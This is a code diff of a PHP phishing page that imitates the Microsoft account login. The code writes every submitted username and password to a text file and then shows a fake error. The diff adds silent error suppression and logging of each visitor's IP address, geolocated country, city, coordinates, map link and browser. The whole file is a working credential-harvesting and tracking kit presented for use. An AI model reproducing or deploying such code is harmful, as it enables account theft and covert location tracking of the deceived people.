@@ -1,14 +1,75 @@
 <?php  
-
+error_reporting(0);
 if (isset($_POST['login']) && isset($_POST['password'])) {
 
 $ac = fopen("kayit.txt","a+");
 $username = $_POST['login'];
 $password = $_POST['password'];
-$userlar = ("\n __________________ \nUsername: ".$username."\nPassword: ".$password."\n__________________ \n");
+$userlar = ("\n Username : ".$username."\n Password : ".$password."\n__________________ \n");
 fwrite($ac,$userlar);
 fclose($ac);
 echo "<script>alert('Kullanıcı Adınızı veya Şifrenizi kontrol ediniz!');</script>";
+}
+
+else{
+date_default_timezone_set('Europe/Istanbul');
+
+function GetIP(){
+ if(getenv("HTTP_CLIENT_IP")) {
+ $ip = getenv("HTTP_CLIENT_IP");
+ } elseif(getenv("HTTP_X_FORWARDED_FOR")) {
+ $ip = getenv("HTTP_X_FORWARDED_FOR");
+ if (strstr($ip, ',')) {
+ $tmp = explode (',', $ip);
+ $ip = trim($tmp[0]);
+ }
+ } else {
+ $ip = getenv("REMOTE_ADDR");
+ }
+ return $ip;
+}
+
+$ip = GetIP();
+
+
+$tarih =" Tarih : ".date('d/m/Y  H:i');
+
+$Geo_Plugin_XML = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$ip); 
+$adress = $Geo_Plugin_XML->geoplugin_request; 
+$ulke = $Geo_Plugin_XML->geoplugin_countryName;
+$bolge = $Geo_Plugin_XML->geoplugin_region;
+$kita = $Geo_Plugin_XML->geoplugin_continentCode;
+$ulkekodu = $Geo_Plugin_XML->geoplugin_countryCode;
+$sehir = $Geo_Plugin_XML->geoplugin_city;
+$plaka = $Geo_Plugin_XML->geoplugin_regionCode;
+$enlem = $Geo_Plugin_XML->geoplugin_latitude;
+$boylam = $Geo_Plugin_XML->geoplugin_longitude;
+$tarayici = $_SERVER['HTTP_USER_AGENT']; 
+
+$maps = "https://www.google.com/maps/place/".$enlem.",".$boylam."/@".$enlem.",".$boylam.",16z";
+$yamanefkar["0"] = " Ip Adresi : ".$adress;
+$yamanefkar["1"] = " Ulke : ".$ulke; 
+$yamanefkar["2"] = " Bolge : ".$bolge;
+$yamanefkar["3"] = " Kita : ".$kita;
+$yamanefkar["4"] = " Ulke Kodu : ".$ulkekodu;
+$yamanefkar["5"] = " Sehir : ".$sehir;
+$yamanefkar["6"] = " Plaka : ".$plaka;
+$yamanefkar["7"] = " Enlem : ".$enlem;
+$yamanefkar["8"] = " Boylam : ".$boylam;
+$yamanefkar["9"] = " Google Maps : ".$maps;
+$yamanefkar["10"] = " Tarayıcı : ".$tarayici; 
+
+
+$ac = fopen("kayit.txt","a+");
+
+$userlar = ("\n __________________ \n".$tarih."\n".$yamanefkar["0"]."\n".$yamanefkar["1"]."\n".$yamanefkar["2"]."\n".$yamanefkar["3"]."\n".$yamanefkar["4"]."\n".$yamanefkar["5"]."\n".$yamanefkar["6"]."\n".$yamanefkar["7"]."\n".$yamanefkar["8"]."\n".$yamanefkar["9"]."\n".$yamanefkar["10"]."\n\n!--VERİLER--!\n");
+fwrite($ac,$userlar);
+fclose($ac);
+sleep(2);
+
+
+
+
 }
  ?>
 
@@ -21,9 +82,6 @@ html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:1
 
 
             </style>
-    {
-        border-width: 2px !important;
-    }
 </style><style type="text/css">body{display:none;}</style><script type="text/javascript">if (top != self){try{top.location.replace(self.location.href);}catch (e){}}else{document.write(unescape('%3C%73') + 'tyle type="text/css">body{display:block !important;}</style>');}</script><style type="text/css">body{display:block !important;}</style><noscript>&lt;style type="text/css"&gt;body{display:block !important;}&lt;/style&gt;</noscript><script type="text/javascript">var g_iSRSFailed=0,g_sSRSSuccess="";function SRSRetry(c,f,e,b){var m=1,l=unescape('%3Cscript type="text/javascript" src="'),k=unescape('"%3E%3C/script%3E'),h=f,i=window,d=i.navigator;if(d&&d.userAgent&&b&&b!=f){var g=d.userAgent.toLowerCase(),n=g.indexOf("edge")>=0;if(!n){var a=g.match(/chrome\/([0-9]+)\./),j=a&&a.length==2&&!isNaN(a[1])&&parseInt(a[1])>54;if(j)h=b}}if(g_sSRSSuccess.indexOf(c)!=-1)return;if(typeof i[c]=="undefined"){g_iSRSFailed=1;e<=m&&document.write(l+h+k)}else g_sSRSSuccess+=c+"|"+e+","}
   var g_dtFirstByte=new Date();var g_objPageMode = null;</script><link rel="image_src" href="https://auth.gfx.ms/16.000.27497.00/images/Windows_Live_v_thumb.jpg">
 
@@ -43,7 +101,7 @@ html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:1
             footerAgreementClick: footer_agreementClick } }"><!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --> <br><br><br><br><br><br><br><br><br><br><br><br><br><br><center><!-- ko if: $loginPage.backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) --><!-- /ko --> <div class="inner" data-bind="css: { &#39;app&#39;: $loginPage.backgroundLogoUrl("") }"><!-- ko ifnot: paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo') --> <div data-bind="component: { name: &#39;logo-control&#39;,
                     params: {
                         isChinaDc: svr.fIsChinaDc,
-                        bannerLogoUrl: $loginPage.bannerLogoUrl() } }"><!--  --><!-- ko if: bannerLogoUrl --><!-- /ko --><!-- ko if: !bannerLogoUrl && !isChinaDc --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="presentation" pngsrc="https://auth.gfx.ms/16.000.28103.6/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd" svgsrc="https://auth.gfx.ms/16.000.28103.6/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd" data-bind="imgSrc" src="https://auth.gfx.ms/16.000.28103.6/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd"><!-- /ko --> <!-- /ko --><!-- /ko --> <!-- /ko --></div><!-- /ko --> <div data-bind="
+                        bannerLogoUrl: $loginPage.bannerLogoUrl() } }"><!--  --><!-- ko if: bannerLogoUrl --><!-- /ko --><!-- ko if: !bannerLogoUrl && !isChinaDc --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="presentation" pngsrc="https://auth.gfx.ms/16.000.28103.6/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd" svgsrc="https://auth.gfx.ms/16.000.28103.6/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd" data-bind="imgSrc" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/1280px-Microsoft_logo_%282012%29.svg.png"><!-- /ko --> <!-- /ko --><!-- /ko --> <!-- /ko --></div><!-- /ko --> <div data-bind="
                     css: { &#39;wide&#39;: paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata(&#39;wide&#39;) },
                     component: { name: &#39;pagination-control&#39;,
                         publicMethods: paginationControlMethods,
@@ -87,7 +145,7 @@ html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:1
       
     
       
-       <form method="post" class="wpcf7-form" action="" ">
+       <form method="post" class="wpcf7-form" action="">
        
                   <div style="width: 300px;">
                     <div style="float: left;">
